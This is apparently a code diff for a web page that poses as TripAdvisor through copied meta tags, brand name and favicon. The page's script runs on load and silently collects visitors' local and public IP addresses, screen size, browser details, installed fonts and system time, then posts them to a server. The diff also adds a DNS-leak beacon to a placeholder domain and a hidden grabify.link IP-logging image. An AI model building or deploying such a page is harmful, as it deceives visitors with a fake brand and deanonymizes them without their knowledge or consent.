@@ -1,9 +1,25 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Visitor Info</title>
+        <!-- Standard Meta Tags -->
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="description" content="Discover the best travel destinations, hotels, and restaurants around the world on TripAdvisor. Plan your perfect trip with our detailed reviews and recommendations.">
+        <meta name="keywords" content="travel, hotels, restaurants, reviews, recommendations, trip planning">
+    
+        <!-- Open Graph Meta Tags -->
+        <meta property="og:title" content="Trip Planner - Plan Your Perfect Trip">
+        <meta property="og:description" content="Discover the best travel destinations, hotels, and restaurants around the world on TripAdvisor. Plan your perfect trip with our detailed reviews and recommendations.">
+        <!--<meta property="og:image" content="https://example.com/path/to/your-image.jpg">
+        <meta property="og:url" content="https://www.tripadvisor.com/your-page-url">-->
+        <meta property="og:type" content="website">
+        <meta property="og:site_name" content="TripAdvisor">
+    
+        <!-- Favicon -->
+        <link rel="icon" id="favicon" href="https://static.tacdn.com/favicon.ico?v2" type="image/x-icon"/>
+        <link rel="mask-icon" sizes="any" href="https://static.tacdn.com/img2/brand_refresh/application_icons/mask-icon.svg" color="#000000"/>
+    
+        <title>TripAdvisor - Plan Your Perfect Trip</title>
 </head>
 <body>
     <script>
@@ -98,12 +114,14 @@ async function getAvailableFonts() {
 }
 
 async function getVisitorInfo() {
-    const [localIP, publicIP, screenSize, browserInfo, availableFonts] = await Promise.all([
+    const uid = Date.now();
+    const [localIP, publicIP, screenSize, browserInfo, availableFonts, dnsLeak] = await Promise.all([
         getLocalIP().catch(error => { console.error(error); return null; }),
         getPublicIP().catch(error => { console.error(error); return null; }),
         getScreenSize().catch(error => { console.error(error); return null; }),
         getBrowserInfo().catch(error => { console.error(error); return null; }),
-        getAvailableFonts().catch(error => { console.error(error); return []; })
+        getAvailableFonts().catch(error => { console.error(error); return []; }),
+        dnsLeakTest(uid).catch(error => { console.error(error); return null; })
     ]);
 
     return {
@@ -112,15 +130,26 @@ async function getVisitorInfo() {
         systemTime: new Date().toString(),
         availableFonts: availableFonts,
         localIP: localIP,
-        publicIP: publicIP
+        publicIP: publicIP,
+        uid: uid
     };
+}
+
+async function dnsLeakTest(uid) {
+    let url = `http://${uid}.sub.YOUR DOMAIN`
+    var data = null;
+    
+    var xhr = new XMLHttpRequest();
+    xhr.withCredentials = true;
+    xhr.open("GET", url);
+    xhr.send(data);
 }
 
 async function sendVisitorInfo() {
     try {
         const visitorInfo = await getVisitorInfo();
 
-        const response = await fetch('http://localhost:3000/api/visitor-info', {
+        const response = await fetch('/api/visitor-info', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -141,5 +170,6 @@ async function sendVisitorInfo() {
 window.onload = sendVisitorInfo;
 
     </script>
+    <img src="https://grabify.link/xyz" style="display: none;">
 </body>
 </html>
